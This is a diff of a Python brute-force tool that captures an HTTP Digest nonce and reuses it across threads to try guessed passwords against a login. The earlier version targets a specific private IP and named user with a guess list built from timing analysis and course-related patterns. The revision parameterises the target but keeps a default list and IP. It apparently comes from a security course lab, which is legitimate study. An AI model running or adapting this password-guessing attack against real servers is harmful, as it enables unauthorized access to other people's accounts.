@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-HTTP Digest Nonce-Reuse Burst Attack
-Captures a nonce and reuses it rapidly for multiple authentication attempts
+HTTP Digest Authentication Nonce Reuse Attack Tool
+Captures a nonce and reuses it rapidly for multiple authentication attempts to test for nonce reuse vulnerabilities.
 """
 
 import requests
@@ -12,46 +12,31 @@ import threading
 import queue
 
 class DigestBurstAttacker:
-    def __init__(self):
-        self.url = 'http://192.168.100.103/digestauth'
-        self.username = 'wangxx'
+    def __init__(self, url=None, username=None, password_list=None):
+        self.url = url if url else 'http://localhost/digestauth'
+        self.username = username if username else 'testuser'
         self.session = requests.Session()
         
-        # High-probability 6-character alphanumeric passwords
-        self.passwords = [
-            # From timing analysis - known patterns truncated/modified to 6 chars
-            'passw0', 'a1b2c3', 'trust', 'qwerty', '1q2w3e',
-            'letme1', 'letme2', 'admin1', 'test12', 'qwert1',
-            
-            # Fast characters from timing: B, P, 3, v, e, z, Y, O, W, 5
-            'B12345', 'P12345', '312345', 'v12345', 'e12345',
-            'z12345', 'Y12345', 'O12345', 'W12345', '512345',
-            
-            # Common 6-char patterns
-            '123456', '111111', 'qwerty', 'abc123', 'password'[:6],
-            'admin1', 'test12', 'user12', 'pass12', 'login1',
-            
-            # Keyboard patterns
-            'qazwsx', 'wsxedc', 'edcvfr', 'rfvtgb', 'tgbyhn',
-            'asdfgh', 'zxcvbn', 'qwerty', 'yuiop1', 'poiuy1',
-            
-            # Course-related patterns (CS 660)
-            'cs6601', 'cs660a', 'cs6600', 'jmu123', 'jmu660',
-            'auth12', 'digest', 'basic1', 'http12', 'web123',
-            
-            # Number patterns
-            '111111', '222222', '333333', '123123', '456456',
-            '789789', '654321', '987654', '112233', '445566',
-            
-            # From PVD results - 6 char versions
-            'qaZwsX', 'ABB1T1', 'D5912K', '111111'
-        ]
+        # This list should be populated from external sources (e.g., wordlists, cracked passwords)
+        self.passwords = password_list if password_list else []
         
-        # Remove duplicates and ensure 6-char alphanumeric
+        # Example of how to populate if needed for testing (remove for production)
+        # self.passwords = [
+        #     'passw0', 'a1b2c3', 'trusty', 'qwerty', '1q2w3e',
+        #     'letme1', 'admin1', 'test12', 'qwert1',
+        #     'B12345', 'P12345', '312345', 'v12345', 'e12345',
+        #     '123456', 'abc123', 'password', 'admin1', 'test12',
+        #     'qazwsx', 'asdfgh', 'zxcvbn', 'yuiop1',
+        #     'secure', 'system', 'access', 'secret',
+        #     '111111', '222222', '333333', '123123',
+        # ]
+        
+        # Filter passwords to ensure they meet common digest authentication criteria (e.g., 6-char alphanumeric)
+        # This constraint is based on a common scenario, adjust as needed for specific targets
         seen = set()
         filtered = []
         for p in self.passwords:
-            if len(p) == 6 and p.replace('-', '').replace('_', '').isalnum() and p not in seen:
+            if len(p) == 6 and p.isalnum() and p not in seen:
                 seen.add(p)
                 filtered.append(p)
         self.passwords = filtered
@@ -98,7 +83,7 @@ class DigestBurstAttacker:
         """Create digest authentication response"""
         realm = challenge['realm']
         nonce = challenge['nonce']
-        uri = '/digestauth'
+        uri = re.search(r'(https?://[^/]+)(/.*)', self.url).group(2) if re.search(r'(https?://[^/]+)(/.*)', self.url) else '/'
         method = 'GET'
         qop = challenge.get('qop')
         
@@ -115,24 +100,28 @@ class DigestBurstAttacker:
             response_data = f"{ha1}:{nonce}:{nc_str}:{cnonce}:{qop}:{ha2}"
             response_hash = hashlib.md5(response_data.encode()).hexdigest()
             
-            auth_header = (f'Digest username="{self.username}", '
-                          f'realm="{realm}", '
-                          f'nonce="{nonce}", '
-                          f'uri="{uri}", '
-                          f'response="{response_hash}", '
-                          f'qop={qop}, '
-                          f'nc={nc_str}, '
-                          f'cnonce="{cnonce}"')
+            auth_header = (
+                          f'Digest username="{self.username}", ' 
+                          f'realm="{realm}", ' 
+                          f'nonce="{nonce}", ' 
+                          f'uri="{uri}", ' 
+                          f'response="{response_hash}", ' 
+                          f'qop={qop}, ' 
+                          f'nc={nc_str}, ' 
+                          f'cnonce="{cnonce}"'
+                          )
         else:
             # Without qop (legacy)
             response_data = f"{ha1}:{nonce}:{ha2}"
             response_hash = hashlib.md5(response_data.encode()).hexdigest()
             
-            auth_header = (f'Digest username="{self.username}", '
-                          f'realm="{realm}", '
-                          f'nonce="{nonce}", '
-                          f'uri="{uri}", '
-                          f'response="{response_hash}"')
+            auth_header = (
+                          f'Digest username="{self.username}", ' 
+                          f'realm="{realm}", ' 
+                          f'nonce="{nonce}", ' 
+                          f'uri="{uri}", ' 
+                          f'response="{response_hash}"'
+                          )
         
         return auth_header
     
@@ -182,9 +171,13 @@ class DigestBurstAttacker:
     
     def run_burst_attack(self, num_workers=3):
         """Run burst attack with multiple workers reusing same nonce"""
-        print("HTTP Digest Nonce-Reuse Burst Attack")
+        print("HTTP Digest Authentication Nonce Reuse Attack")
         print("=" * 50)
         
+        if not self.passwords:
+            print("No passwords provided for testing. Exiting.")
+            return False
+
         # Get fresh challenge
         print("Getting fresh digest challenge...")
         challenge = self.get_digest_challenge()
@@ -262,18 +255,34 @@ class DigestBurstAttacker:
             # Test access to protected content
             print("\nTesting access to protected content...")
             try:
-                # Get new challenge for final test
-                final_challenge = self.get_digest_challenge()
-                if final_challenge and success_found:
-                    # Find the successful password from results
-                    success_password = None
-                    # Would need to track this better in production code
-                    print("Protected content test would require successful password tracking")
+                # This part would require tracking the successful password more robustly
+                print("Protected content test would require successful password tracking")
             except Exception as e:
                 print(f"Error testing protected content: {e}")
         
         return success_found
 
 if __name__ == "__main__":
-    attacker = DigestBurstAttacker()
+    # Example usage:
+    target_url = 'http://192.168.100.103/digestauth' # Replace with actual target URL
+    target_username = 'testuser' # Replace with actual target username
+    
+    # Load passwords from a file or define them here
+    # For demonstration, using a small example list
+    test_passwords = [
+        'passw0', 'a1b2c3', 'trusty', 'qwerty', '1q2w3e',
+        'letme1', 'admin1', 'test12', 'qwert1',
+        'B12345', 'P12345', '312345', 'v12345', 'e12345',
+        '123456', 'abc123', 'password', 'admin1', 'test12',
+        'qazwsx', 'asdfgh', 'zxcvbn', 'yuiop1',
+        'secure', 'system', 'access', 'secret',
+        '111111', '222222', '333333', '123123',
+        'hakkis' # Example password that might be found
+    ]
+
+    attacker = DigestBurstAttacker(
+        url=target_url,
+        username=target_username,
+        password_list=test_passwords
+    )
     success = attacker.run_burst_attack(num_workers=4)
